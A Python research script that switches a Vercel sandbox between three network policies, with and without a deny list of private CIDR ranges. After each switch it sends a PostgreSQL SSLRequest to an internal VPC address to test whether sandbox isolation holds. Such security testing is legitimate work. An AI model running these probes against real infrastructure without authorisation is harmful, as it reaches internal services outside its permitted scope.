# -*- coding: utf-8 -*-
"""N 线最终确认: deniedCIDRs 数据层验证 (PG SSLRequest 对照实验)"""
import json, re, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s' % (TEAM, PROJ))
d = json.loads(r)
sid = d['sandbox']['currentSessionId']
print('npol1 sid:', sid, flush=True)

PG = "import socket,struct; s=socket.socket(); s.settimeout(3); s.connect(('172.31.0.2',5432)); s.sendall(struct.pack('!II',8,80877103)); import time; time.sleep(0.5);\ntry:\n d=s.recv(4); print('PG_RESP', d)\nexcept Exception as e:\n print('PG_ERR', type(e).__name__)"

def pg_probe(sid, tag):
    c, r = cmd(sid, 'python3', ['-c', PG], timeout_ms=30000)
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    print('[%s] %s' % (tag, out[:200]), flush=True)
    return out

# 阶段1: custom + deny 172.31.0.0/16 (模拟 operator 缓解配置)
body = {
    "mode": "custom",
    "allowedDomains": ["httpbin.org"],
    "deniedCIDRs": ["172.31.0.0/16", "10.0.0.0/8", "100.64.0.0/10", "192.168.0.0/16", "169.254.0.0/16"]
}
c, r = api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM), body)
print('phase1 set (with deniedCIDRs):', c, flush=True)
time.sleep(3)
pg_probe(sid, 'P1-with-deny-vpc5432')

# 阶段2: 同沙箱去掉 deniedCIDRs (对照)
body2 = {
    "mode": "custom",
    "allowedDomains": ["httpbin.org"]
}
c, r = api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM), body2)
print('phase2 set (no deny):', c, flush=True)
time.sleep(3)
pg_probe(sid, 'P2-no-deny-vpc5432')

# 阶段3: 切 deny-all 对照
body3 = {"mode": "deny-all"}
c, r = api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM), body3)
print('phase3 set (deny-all):', c, flush=True)
time.sleep(3)
pg_probe(sid, 'P3-denyall-vpc5432')

print('=== N-FINAL DONE ===', flush=True)
